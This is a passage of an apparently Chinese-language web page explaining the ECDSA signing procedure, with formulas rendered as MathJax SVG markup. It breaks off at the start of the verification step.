2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1028.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2084.6,0)\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2604.6,0)\"><path data-c=\"1D43A\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z\"/></g></g></g></svg></mjx-container></span>，签名过程为：</p>\n<ol type=\"1\">\n<li>选取随机数 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.025ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.179ex\" height=\"1.595ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 521 705\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g></g></g></svg></mjx-container></span>，计算 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.186ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"7.691ex\" height=\"1.781ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -705 3399.6 787\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D445\" d=\"M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1036.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2092.6,0)\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2613.6,0)\"><path data-c=\"1D43A\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z\"/></g></g></g></svg></mjx-container></span>，取 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.357ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"13.746ex\" height=\"1.927ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 6075.6 851.8\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D45F\" d=\"M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(728.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(1784.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D445\" d=\"M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(792,-150) scale(0.707)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(3308.8,0)\"><path data-c=\"6D\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(833,0)\"/><path data-c=\"64\" d=\"M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z\" transform=\"translate(1333,0)\"/></g><g data-mml-node=\"mi\" transform=\"translate(5475.6,0)\"><path data-c=\"1D45B\" d=\"M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z\"/></g></g></g></svg></mjx-container></span>；</li>\n<li>计算 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"26.856ex\" height=\"2.452ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -833.9 11870.2 1083.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(746.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(1802.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(554,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(778,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><g data-mml-node=\"mo\" transform=\"translate(3310.2,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3699.2,0)\"><path data-c=\"1D43B\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4587.2,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4976.2,0)\"><path data-c=\"1D45A\" d=\"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5854.2,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(6465.5,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(7465.7,0)\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(7985.7,0)\"><path data-c=\"1D45F\" d=\"M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(8436.7,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(9103.5,0)\"><path data-c=\"6D\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(833,0)\"/><path data-c=\"64\" d=\"M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z\" transform=\"translate(1333,0)\"/></g><g data-mml-node=\"mi\" transform=\"translate(11270.2,0)\"><path data-c=\"1D45B\" d=\"M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z\"/></g></g></g></svg></mjx-container></span>；</li>\n<li>签名为对 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.848ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 2142.7 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mo\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(389,0)\"><path data-c=\"1D45F\" d=\"M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(840,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1284.7,0)\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1753.7,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> 的组合。</li>\n</ol>\n<p>验证方根据公钥 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: 0;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.699ex\" height=\"1.545ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -683 751 683\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D443\" d=\"M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 